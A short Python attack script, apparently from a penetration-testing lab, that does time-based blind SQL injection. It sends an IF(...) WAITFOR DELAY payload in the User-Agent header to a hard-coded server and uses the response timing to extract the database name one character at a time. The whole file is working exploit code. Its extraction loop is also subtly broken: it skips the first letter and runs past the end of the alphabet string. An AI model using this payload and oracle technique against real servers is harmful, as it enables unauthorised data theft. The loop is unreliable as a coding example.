#!/usr/bin/python3

# module Oracle Design
# blind sql injection - time based type

import requests
import time

# Define the length of time (in seconds) the server should
# wait if `q` is `true`
DELAY = 1

# Evalutes `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    r = requests.get(
        "http://10.129.204.197:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

def exfiltrate_dbname_fifth_char():
    dictionary = "qwertyuiopasdfghjklzxcvbnm"
    for i in range(1, 26+1):
        print(dictionary[i])
        if oracle(f"(select substring(db_name(), 5, 1)) = '{dictionary[i]}'"):
            print(f"[+] The fifth letter of DB name: {dictionary[i]}")


# Verify that the oracle works by checking if the correct
# values are returned for queries `1=1` and `1=0`
assert oracle("1=1")
assert not oracle("1=0")

print(oracle("1=1"))
print(oracle("1=0"))
print(oracle("(select substring(db_name(), 5, 1)) = 'a'"))
exfiltrate_dbname_fifth_char()
